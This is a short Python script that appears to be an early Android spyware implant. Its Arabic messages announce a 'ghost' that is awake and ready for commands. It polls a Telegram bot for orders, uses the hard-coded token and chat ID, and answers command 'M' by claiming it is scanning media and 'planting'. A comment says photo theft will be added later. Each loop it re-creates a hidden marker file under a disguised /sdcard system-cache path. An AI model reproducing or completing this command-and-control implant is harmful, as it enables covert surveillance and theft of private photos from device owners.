import os
import time
import requests

TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"

def get_command():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1"
        res = requests.get(url, timeout=10).json()
        if res.get("result"):
            return res["result"][0].get("message", {}).get("text", "").upper()
    except: return None

if __name__ == '__main__':
    # إبلاغ البوت بالاستيقاظ
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "💀 الشبح استيقظ وجاهز للأوامر..."})
    
    while True:
        command = get_command()
        if command == "M":
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                          data={"chat_id": CHAT_ID, "text": "📸 استلمت الأمر M.. جاري فحص الوسائط والزرع!"})
            # هنا ستتم إضافة وظيفة سحب الصور لاحقاً
        
        # التأكد من ثبات ملف الزرع
        check_path = "/sdcard/Android/.system_cache_data/.core_bridge"
        if not os.path.exists(check_path):
            try:
                os.makedirs(os.path.dirname(check_path), exist_ok=True)
                with open(check_path, "w") as f: f.write("RE-PLANTED")
            except: pass
            
        time.sleep(10)
